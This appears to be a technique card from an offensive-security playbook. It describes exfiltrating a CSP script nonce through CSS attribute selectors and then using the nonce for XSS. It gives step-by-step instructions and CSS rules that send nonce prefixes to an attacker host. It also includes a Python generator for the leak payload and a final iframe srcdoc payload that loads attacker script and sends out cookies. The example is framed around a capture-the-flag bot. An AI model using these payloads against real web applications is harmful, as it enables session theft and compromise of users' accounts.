---
name: css_attribute_selector_nonce_exfil
vuln_type: xss
sub_technique: css_attribute_exfil
category: exploitation
safety_level: safe
---

# Css Attribute Selector Nonce Exfiltration — Csp Bypass Via Style-Src Unsafe-Inline

## When to Apply

A web page uses CSP with `script-src 'nonce-<random>'` to restrict scripts, but allows `style-src 'unsafe-inline'`. The nonce value is present in the DOM as an attribute on a `<script>` tag. Attacker can inject HTML via innerHTML/stored XSS that includes `<style>` blocks with CSS attribute selectors like `script[nonce^="prefix"] { background-image: url(attacker?c=X) }`. By iterating prefix characters, the full nonce is leaked to the attacker server one character at a time. With the nonce, the attacker can inject a script tag (e.g., via `<iframe srcdoc>`) that passes the CSP nonce check.

## Prerequisites

- CSP: script-src 'nonce-<value>' (blocking inline scripts without nonce)
- CSP: style-src 'unsafe-inline' (allowing injected <style> tags)
- HTML injection or stored XSS via innerHTML that preserves <style> tags
- Nonce value is present as an attribute in the DOM (e.g., <script nonce='...'>)
- Attacker can trigger multiple page renders (hashchange navigation) to iterate nonce characters
- External attacker server to receive CSS background-image callbacks

## Steps

1. Identify CSP: `script-src 'nonce-X'` + `style-src 'unsafe-inline'`
2. Confirm innerHTML sink that preserves `<style>` tags in page content
3. Locate `<script nonce="...">` in page source — nonce is in DOM
4. Inject CSS with attribute selectors for each candidate character:
   ```css
   script[nonce^="a"] { background-image: url(http://attacker/leak?n=a) }
   script[nonce^="b"] { background-image: url(http://attacker/leak?n=b) }
   ...
   ```
5. When CSS loads, browser requests the URL matching the actual nonce prefix
6. Attacker server receives the hit, extends the known prefix by one character
7. Generate new CSS payload with `script[nonce^="known_prefix+X"]` for next char
8. Use hashchange navigation to reload content on same page (nonce stays stable)
9. Repeat until full nonce is recovered (typically 16-32 chars)
10. Inject final XSS payload with stolen nonce:
    `<iframe srcdoc="<script nonce=STOLEN src=//attacker/evil.js></script>">`
11. Script executes with valid nonce, reads document.cookie, exfiltrates flag

## Code Template

```
# Generate CSS nonce-leak payload for one round
charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
known_prefix = ''  # accumulated from previous rounds
rules = []
for c in charset:
    rules.append(
        f'script[nonce^="{known_prefix}{c}"] {{'
        f'  background-image: url({attacker_url}/leak?n={known_prefix}{c})'
        f'}}'
    )
payload = '<style>* { display: block !important; }' + '\n'.join(rules) + '</style>'
# Post payload as note content, share it, navigate bot via hashchange
```

## Examples

### Example 1

- **csp**: script-src 'nonce-<random16>'; frame-src 'none'; style-src 'unsafe-inline'
- **nonce_length**: 16
- **nonce_charset**: a-z0-9
- **innerHTML_sink**: shared note content rendered via innerHTML
- **hashchange_rerender**: share_read.js listens for hashchange → re-fetches and re-renders
- **final_xss**: <iframe srcdoc="<script nonce=NONCE src=//evil/ex.js></script>">
- **cookie_target**: FLAG cookie (httpOnly=false, sameSite=Strict)

The nonce is stable per page load — hashchange re-renders content but doesn't change the nonce. `* { display: block !important }` ensures the script element is visible for CSS background-image to fire. The bot visits with FLAG cookie set on localhost. sameSite=Strict means the attack must execute from same origin. CSRF via form POST to /write from attacker page creates the malicious notes.
